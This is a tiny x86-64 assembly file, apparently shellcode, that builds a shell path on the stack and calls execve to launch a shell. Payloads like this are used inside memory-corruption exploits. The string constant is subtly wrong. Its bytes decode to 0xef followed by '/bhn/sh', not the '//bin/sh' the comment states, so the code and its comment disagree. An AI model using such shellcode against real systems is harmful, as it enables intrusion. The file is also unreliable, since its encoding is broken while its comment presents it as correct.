; execve64.asm

section .text
global _start

_start:
xor rax, rax
push rax	;string terminator
mov rax, 0x68732f6e68622fef ;"hs/nib//"
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
xor rax, rax	;rax = 0
mov al, 0x3b	;execve()
syscall
